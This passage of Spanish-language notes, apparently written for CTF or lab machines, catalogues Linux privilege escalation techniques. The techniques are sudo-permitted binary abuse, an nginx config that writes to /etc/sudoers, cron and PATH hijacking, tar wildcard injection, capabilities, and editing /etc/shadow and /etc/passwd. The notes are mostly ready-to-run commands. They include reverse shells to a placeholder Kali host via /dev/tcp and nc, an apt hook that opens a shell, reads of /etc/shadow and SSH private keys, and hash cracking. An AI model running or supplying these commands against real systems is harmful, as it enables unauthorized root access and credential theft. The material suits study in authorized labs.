sudo -u root /usr/bin/nokogiri /etc/passwd

me aparece para que ingrese comandos:

irb(main):001:0>

ejecuto:

exec '/bin/bash -i'

listo soy root !!!


69.-	/usr/bin/node

(root) NOPASSWD: /usr/bin/node

sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

70.- 	/usr/bin/ex


(root) NOPASSWD: /usr/bin/ex

sudo /usr/bin/ex

luego escribimos


:!/bin/bash

o

:!/bin/sh

71.- /usr/bin/busybox

 (will) NOPASSWD: /usr/bin/busybox

sudo -u will /usr/bin/busybox sh

72.- /usr/bin/pass


Listamos passwords stores

sudo /usr/bin/pass ls 

`-- root
    |-- password
    `-- shell


ejecutamos para escalar privilegios:

sudo /usr/bin/pass root/password

/usr/bin/pass trabaja con archivos .gpg 

por lo tanto debo buscar archivos con esa extensión
los archivos gpg están encriptados, la forma de saber si están encriptado es:

md5sum archivo.ext


para los archivos gpg hay una herramienta que se llama gpg2john para sacar el hash y crackearlos

gpg2john root.pgp > hash

john -w=/usr/share/wordlists/rockyou.txt hash

john hash --show

vuelvo a ejecutar: 

sudo /usr/bin/pass root/password

escribo la contraseña encontrada con John the ripper y listo puedo ver la contraseña de root

ejemplo

sudo /usr/bin/pass root/password

resultado:
r00tP@zzW0rD123


con esa contraseña elevo a root
su root
y escribo la contraseña y listo soy root !!!

73.-	/usr/bin/nmcli

el binario /usr/bin/nmcli es la herramienta de línea de comandos (CLI) para interactuar con NetworkManager, un servicio que gestiona las conexiones de red en sistemas Linux. Su nombre significa NetworkManager Command-Line Interface.

(root) NOPASSWD: /usr/bin/nmcli

ver redes almacenadas:

 /usr/sbin/sudo nmcli connection show

me puede aparecer algo como esto:

NAME         UUID                                  TYPE  DEVICE 
MikroTik_AP  e25d230b-bb26-4488-b2e0-1b94dac2b9cd  wifi  -- 

para este caso es una red wifi

ahora busco información sobre la red wifi MikroTik_AP 

find / -name MikroTik_AP 2>/dev/null

/etc/NetworkManager/system-connections/MikroTik_AP

veo permisos:

ls -l /etc/NetworkManager/system-connections/MikroTik_AP


ver contraseñas:

/usr/sbin/sudo -u root nmcli -s -g 802-11-wireless-security.psk connection show "MikroTik_AP"

74.- 	/home/shrek/header_checker

(ALL) NOPASSWD: /home/shrek/header_checker

sudo -u root /home/shrek/header_checker --help

Usage: /home/shrek/header_checker --url '<url>' [--timeout <timeout>] [--method <method>] [--headers <custom_headers>]

Flags:
  --url '<url>'             The URL to fetch headers from (required)
  --timeout <timeout>     The maximum time (in seconds) to wait for a response (optional, default: 10)
  --method <method>       The HTTP method to use (optional, default: GET)
  --headers <headers>     Custom headers to send with the request (optional)
  --help                  Display this help message
Example: ./header_checker --url "google.com"

sudo -u root /home/shrek/header_checker --url ";chmod 4755 /bin/bash"

/bin/bash -pi

75.- 	/usr/sbin/arp

me permite ver archivos

(root) NOPASSWD: /usr/sbin/arp

ejecutando:

LFILE=file_to_read
sudo arp -v -f "$LFILE"

ejemplo

LFILE=/etc/shadow
sudo arp -v -f "$LFILE"

me sale el archivo pero con error:

arp: cannot set entry on line 49 of etherfile /path/to/file !

solo hay que ordenar y quitar la linea de arriba para poder leer

76.- 	/usr/bin/iex

sudo /usr/bin/iex

dentro de elixir:

System.cmd("bash", ["-c", "bash -i >& /dev/tcp/TU_IP/PORT 0>&1"])

y listo somos root


77.-	/usr/bin/ascii85

Me permite leer archivos, como por ejemplo id_rsa

(ALL) NOPASSWD: /usr/bin/ascii85

LFILE=/home/lenam/.ssh/id_rsa

sudo ascii85 "$LFILE" | ascii85 --decode

78.-	/usr/bin/batcat

(beavis) NOPASSWD: /usr/bin/batcat

sudo -u beavis /usr/bin/batcat --paging always /etc/profile

escriimos

!/bin/sh

79.-	/usr/bin/su

(root) PASSWD: /usr/bin/su

sudo su

listo somos root !!!

80.-	/usr/bin/mutt

(root) NOPASSWD: /usr/bin/mutt

ejecutamos:

sudo /usr/bin/mutt

nos aparece una pantalla y presionamos shift + ! y en la parte dónde dice command shell escibimos /bin/bash luego enter

listo somos root !!!

81.-	/usr/sbin/nginx

(root) NOPASSWD: /usr/sbin/nginx

- Creamos el archivo exploit.conf en tmp

exploit.conf:

user root;
worker_processes auto;
error_log /tmp/error.log;

events {
    worker_connections 768;
}

http {
    log_format exploit 'TU_USUARIO ALL=(ALL) NOPASSWD: ALL';  # Reemplaza TU_USUARIO
    access_log /etc/sudoers exploit;  # Apunta al archivo sudoers

    server {
        listen 8080;  # Usa un puerto no ocupado
        location / {
            return 200;
        }
    }
}

-ejecutamos

 curl http://localhost:8080 

y si no funciona curl:

wget http://localhost:8080

- volvemos a ejecutar sudo -l
me tiene que aparecer:

    (ALL) NOPASSWD: ALL

- hago sudo su y listo soy root !!!

82.-	/usr/bin/xargs

(jones) NOPASSWD: /usr/bin/xargs


sudo -u jones /usr/bin/xargs -a /dev/null sh

83.-	/usr/bin/crash


(travis) NOPASSWD: /usr/bin/crash

sudo -u travis /usr/bin/crash -h

se nos abre una ventana y escribimos:

!sh

84.-	/usr/bin/xauth

(root) NOPASSWD: /usr/bin/xauth

sudo /usr/bin/xauth

se nos abre una pantalla interactiva y ejecutamos el comando " ? " :

xauth> ?

luego:

xauth> source /root/.ssh/id_rsa

Nota:

- Podemos ver archivos que con un usuario normal no podemos ver.

85.-	/usr/bin/units

(root) NOPASSWD: /usr/bin/units

con la opción -f podemos leer archivos:

sudo /usr/bin/units -f /root/.ssh/id_rsa

86.- 	/usr/bin/nnn

(root) NOPASSWD: /usr/bin/nnn

sudo /usr/bin/nnn

presionamos la letra e

luego 

!/bin/bash y somos root

87.-	/usr/bin/aoss

(root) NOPASSWD: /usr/bin/aoss

sudo /usr/bin/aoss /bin/sh

88.- 	/usr/bin/expect

(root) NOPASSWD: /usr/bin/expect

sudo /usr/bin/expect -c 'spawn /bin/sh;interact'


********************************************************

Parte 3.- cron jobs

cat /etc/crontab


********************************************************

Parte 4.- Listar los procesos que se ejecutan en el sistema:

comando:
ps -faux


root   1  0.0  0.0   2616  1712 ?   Ss   13:15   0:00 /bin/sh -c service apache2 start && while true; do php /opt/script.php; sleep 5; done

ls -l /opt/script.php
------------------------------
-rw-r--r-- 1 chocolate chocolate 59 May  7 13:55 /opt/script.php

Podremos cambiarlo a nuestro antojo para ejecutar algo como el usuario root:

echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php

Y tras esperar un poco:

ls -l /bin/bash
----------------------------
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash


Vemos que la bash ya es SUID por lo que podemos escalar privilegios.

bash -p
whoami
----------------
root

********************************************************
Parte 5.- CAPABILITIES

las capabilities funcionan con binarios

Ver capabilities

getcap -r / 2>/dev/null

A.- /usr/bin/perl = cap_setuid+ep

Escogemos una ruta dónde podamos escribir (tmp) y hacemos:

echo -ne '#!/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nex ec "/bin/bash";' > script.pl


dentro de la ruta donde podemos ejecutar el comando de arriba.
./script.pl

A.1.- /usr/bin/perl5.36.0 cap_setuid=ep

ejecutamos

/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

B.- cap_net_bind_service

********************************************************
Parte 6.- Herramientas de tercero (Linpeas, Pspy64)

máquina vulnvault -> linpeas

You can write script: /usr/local/bin/echo.sh 

se agrega al final del archivo chmod u+s /bin/bash

ctrl + s, ctrl + x

bash -p 

y listo somos root !!!

pspy64

/usr/sbin/CRON -f 
/bin/sh -c cd /var/www/html && tar -zcf /var/backups/serve.tgz * 
 tar -zcf /var/backups/serve.tgz index.html 
 /bin/sh -c gzip

Se puede obtener el root mediante la colocación de archivos maliciosos aprovechando el manejo de comodines de la siguiente forma:

en /var/www/html ejecutamos:

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh script.sh"

creamos un archivo script.sh

#!/bin/bash
nc -c /bin/bash IP-KALI 4444



Permisos de escritura sobre la carpeta /etc/apt/apt.conf.d

entramos en la carpeta /etc/apt/apt.conf.d

creamos un archivo 00rev, cuyo contenido es:

#!/bin/bash

APT::Update::Pre-Invoke {"nc IP-KALI PORT -e /bin/bash"}

me pongo en escucha en el puerto PORT y listo soy root !!!


********************************************************

Parte 7.- Ver resultados del comando id:

a.- membresía del grupo - 6(disk)

El grupo de discos le da al usuario acceso a cualquier dispositivo de bloque contenido en /dev/. Podemos aprovechar esto para acceder al sistema de archivos raíz y leer el archivo /etc/shadow para descifrar la contraseña del usuario raíz

ejemplo

enumeramos:
df -h


resultado
/dev/sda1


ejecutamos
/usr/sbin/debugfs /dev/sda1

resultado:
debugfs: 

ejecutamos:
debugfs: mkdir test

resultado :
mkdir: Filesystem opened read/only 


ejecutamos:
debugfs:  cat /etc/shadow

copiamos el hash el usuario root y tratamos de crackear

b.- docker

ejecutamos: 

docker run -it --rm --privileged ubuntu bash


listo somos root.
********************************************************

Parte 8.- Busque la palabra password

grep -Ri "password" / 2>/dev/null

********************************************************

Parte 9.- Permisos de escritura en:

ls -la /etc/group

me conecté por ssh a la víctima con el usuario lancer:

entonces edité el archivo:

nano /etc/group

sudo:x:27:lancer

cerré sesión y volví a conectarme por ssh

hice id 

sudo su

escribí la contraseña de lancer y listo ya soy root

-------------------------------------------------------------------------------

ls -la /etc/shadow - si pertenecemos al grupo shadow

eliminamos desde el $ después de los ":" después de la palabra root hasta antes de los ":"

root:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20135:0:99999:7:::


root::20135:0:99999:7:::

ejecutamos su root y no escribimos contraseña

como también podemos crear una contraseña con openssl

openssl passwd password1

copiamos el hash y lo pegamos en el /etc/shadow

-------------------------------------------------------------------------------

Permisos de escritura sobre /etc/passwd

paso 1.- Genera una contraseña encriptada:

openssl passwd -1 "tupassword"

ejemplo de salida

pass_encriptada:

$1$l4NFcLkS$Jsl9./0lGL1coSBrufCyP/

Paso 2: ejecuta nano /etc/passwd

añade la línea

evil:pass_encriptada:0:0:root:/root:/bin/bash

Paso 3: su evil

escribimos la contraseña tupassword

listo somos root !!!


********************************************************

Parte 10.- Variable de entorno PATH

puedo verlo de 2 maneras:

a.- con el comando echo $PATH

b.- con crontab cat /etc/crontab

Máquina first

al ejecutar el comando cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/var/www/html:/bin:/usr/sbin:/usr/bin

# Example of job definition:

* * * * * root ping -c1 raspberrypi.com

en el PATH se incluye/var/www/html que es riesgoso porque:

Alguien puede subir un archivo ejecutable o un script PHP/Shell malicioso allí.

Un usuario desprevenido ejecuta un comando que tiene el mismo nombre que un binario malicioso en esa carpeta.

el ataque se llama Ataque: Hijacking del PATH para Escalar Privilegios

Requisitos:

Tener permisos de escritura en:

/var/www/html

ejecutamos:

ls -l /var/www

colocar un archivo ping que sea ejecutable.

Que el sistema ejecute esa línea del crontab con PATH mal configurado (como en este caso)

Entonces por lo expuesto, ejecutamos los siguientes comandos:

echo '#!/bin/bash' > /var/www/html/ping

echo 'cp /bin/bash /tmp/rootbash' >> /var/www/html/ping

echo 'chmod +s /tmp/rootbash' >> /var/www/html/ping

chmod +x /var/www/html/ping

Luego de esperar un min ya que así lo dice el crontab:

ejecutamos:

/tmp/rootbash -p


Otra forma de hacerlo:

creo un archivo ping y coloc el siguiente código en su interior:

#//bin/bash
bash -c "bash -i >& /dev/tcp/IP-KALI/443 0>&1"

luego en kali me pongo en escucha con netcat en el puerto 443 y listo tengo conexión con el usuario root.

********************************************************

Parte 11.- Ver la variable de entorno env:

ejecutamos env

podemos encontrar alguna contraseña de algún usuario

env | grep username

Ejemplo para el usuario dylan

env | grep dylan

Parte 12.- Ver permisos SGID

funciona con binarios SUID:

find / -perm -4000 -type f 2>/dev/null

********************************************************

Parte 12.- Archivos con permisos de escritura:

find / -writable 2>/dev/null | grep -v -i -E 'proc|sys|dev|run|irc|home|tmp'

- /etc/hosts -> tiene que funcionar con alguna tarea cron que se ejecute ping algún dominio, lo podemos analizar con pspy64

- /opt/service.ps1
con esto veo si un ejecutable se ejecuta usando una tarea cron:

while true; do ps aux | grep -e "service.ps1" | grep -v grep; done

********************************************************

Parte 13.- Comando history

history

********************************************************

Parte 14.- Ejecutar fuerza bruta al usuario root con suForce

https://github.com/d4t4s3c/suForce/tree/main

Parte 15.- listar conexiones de red activas y sockets en escucha (servicios)


ss -tuln

********************************************************

Nota:
- Si no me funciona niguna de las opciones antes mencionas líneas arriba para escalar a root, entonces pruebo con la herramienta suForce para crackear la contraseña de root.

























